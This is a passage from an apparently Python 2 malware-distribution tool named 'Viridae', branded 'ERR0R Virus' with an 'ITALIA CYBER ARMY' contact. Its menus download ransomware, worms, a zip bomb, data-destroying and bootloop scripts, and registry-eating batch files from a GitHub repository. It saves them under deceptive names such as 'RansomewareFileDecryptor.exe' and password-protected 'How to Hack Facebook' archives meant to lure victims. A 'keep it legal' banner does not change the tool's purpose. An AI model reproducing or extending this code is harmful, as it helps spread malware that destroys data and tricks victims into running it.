		menu3 = input(""+B+"root@viridae ->> "+R+"")
		if menu3 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ugly.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ugly.bat?raw=true' Windows/Ugly.bat")
			print(fun)#####done
			
		elif menu3 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/sleepy.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'sleepy.bat?raw=true' Windows/Sleepy.bat")
			print(fun)#####done
			
		elif menu3 == 3:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/reg-eater.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'reg-eater.bat?raw=true' Windows/Reg-eater.bat")
			print(fun)#####done
			
		elif menu3 == 4:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/kuis.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'kuis.bat?raw=true' Windows/Kuis.bat")
			print(fun)#####done
			
		elif menu3 == 5:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/koce.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'koce.bat?raw=true' Windows/Koce.bat")
			print(fun)#####done
			
		elif menu3 == 6:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cmd.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'cmd.bat?raw=true' Windows/Cmd.bat")
			print(fun)#####done
			
		elif menu3 == 7:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/capslock.vbs?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'capslock.vbs?raw=true' Windows/Capslock.vbs")
			print(fun)#####done
			
		elif menu3 == 8:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/alay.vbs?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'alay.vbs?raw=true' Windows/Alay.vbs")
			print(fun)#####done
			
		elif menu3 == 9:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ransomeware.exe?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ransomeware.exe?raw=true' Windows/RansomewareFileDecryptor.exe")
			print(fun)#####done
			
		elif menu3 == 10:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/RIP.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'RIP.bat?raw=true' Windows/RIP.bat")
			print(fun)#####done
		elif menu3 == 11:
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong Number")
	except Exception:
		print(""+R+"[!] This is NOT a Number")
		
#######################Done  PC

####################start PDF
def Vpdfautorunpc():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+B+"How to Hack Facebook (ext: rar)")
	print(""+O+"["+GR+"02"+O+"] Hack facebook        (ext: rar)")
	print(""+O+"["+GR+"03"+O+"] "+B+"Back")
	print("")
	print(""+R+"[==========="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+"ARMY|•|"+R+"===========]")
	print("")

	try:
		menu4 = input("root@viridae ->>"+G+" ")
		if menu4 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/howtohackfb.rar?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'howtohackfb.rar?raw=true' Pdf-autorun-windows/How-to-hack-facebook.rar")
			print(fun)#####done
			print("password: cracker\n")
		elif menu4 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/hackfacebook.rar?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'hackfacebook.rar?raw=true' Pdf-autorun-windows/Hack-facebook.rar")
			print(fun)#####done
			print("password: cracker\n")
		elif menu4 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong number")
	except NameError:
		print(""+R+"[!] This is not number")
	except Exception as err:
		print(""+R+"[!] This is not number")
		
######################Done pdf

############Worm and Bomb zip
def Vother():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+B+"Worm.bat")
	print(""+O+"["+GR+"02"+O+"] Bomb.zip")
	print(""+O+"["+GR+"03"+O+"] "+B+"Back")
	print("")
	print(""+R+"[=============="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+"ARMY|•|"+R+"===============]")
	print("")
	try:
		menu5 = input(""+R+"root@viridae ->> "+R+"")
		if menu5 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/worm.bat?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'worm.bat?raw=true' Worm-and-Bombzip/worm.bat")
			print(fun)#####done
		
		elif menu5 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bom-zip.zip?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'bom-zip.zip?raw=true' Worm-and-Bombzip/Bomb.zip")
			print(fun)#####done
		
		elif menu5 == 3:
			print("\n")
			menu()	
		else:
			print(""+R+"[!] ERR...Wrong Number")
	except Exception:
		print(""+G+"[!] This is NOT a Number")
		
###############Start Shell Virus		
def Shellvirus():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+B+"Data-Eater.sh")
	print(""+O+"["+GR+"02"+O+"] "+B+"Bootloop.sh")
	print(""+O+"["+GR+"03"+O+"] "+B+"Back")
	print("")
	print(""+R+"[==========="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+"ARMY|•|"+R+"===========]")
	print("")
	
	try:
		menu6 = input(""+G+"root@viridae ->> "+GR+"")
		if menu6 == 1:
			print(""+B+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'data-eater.sh?raw=true' Shell-virus/Data-Eater.sh")
			print(fun)#####done
			
		elif menu6 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'bootloop.sh?raw=true' Shell-virus/Bootloop.sh")
			print(fun)#####done
		elif menu6 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong Input")
	except Exception:
		print(""+R+"[!] This is NOT a Number")
		
def banner2():
	print("")
	print(""+O+"Please "+R+" Do NOT ")
	print("")
        print(""+O+"Use This Tool For"+R+" Illegal Activity")
	print("")
	print(" "+R+" [!] "+O+" Keep It "+G+"Legal "+R+"DON'T Illegal "+R+" [!]"+G+"")
	print("")
	print("")
def menu():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+C+"Android\t\t"+O+"["+GR+"4"+O+"] "+G+"Pdf Autorun PC\t["+GR+"7"+O+"] "+C+"Update ")
	print(""+O+"["+GR+"02"+O+"] "+G+"Macosx\t\t["+GR+"5"+O+"] "+C+"Other\t\t"+O+"["+GR+"8"+O+"] "+G+"About")
	print(""+O+"["+GR+"03"+O+"] "+C+"Windows\t\t"+O+"["+GR+"6"+O+"] "+G+"Shell\t\t["+GR+"9"+O+"]"+C+" Exit")
	print("")
	print(""+R+"[==========="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+W+"CYBER "+R+"ARMY|•|"+R+"===========]")
	print("")
	try:
		menu = input("\n "+G+" [★root@viridae★]->> "+B+" ")
		if menu == 1:
			os.system("clear")
			Vandroid()
		elif menu == 2:
			os.system("clear")
			Vmacosx()
		elif menu == 3:
			os.system("clear")
			vpcwin()
		elif menu == 4:
			os.system("clear")
			Vpdfautorunpc()
		elif menu == 5:
			os.system("clear")
			Vother()
		elif menu == 6:
			os.system("clear")
			Shellvirus()
		elif menu == 7:
			os.system("clear")
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Err0r-ICA/Viridae'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Viridae.py?raw=true' Viridae.py")
			os.system("python2 Viridae.py")
		elif menu == 8:
			os.system("clear")
			about()
		elif menu == 9:
			fontcolor()
			os.system("clear")
			sys.exit()
		else:
			print(""+R+"[!] Wrong Input")
	except Exception:
		print(""+R+"[!] This is NOT a Number")
	
if __name__ == "__main__":

	os.system("clear")
	banner()
	banner2()
	menu()
	fontcolor()
	sys.exit()
		




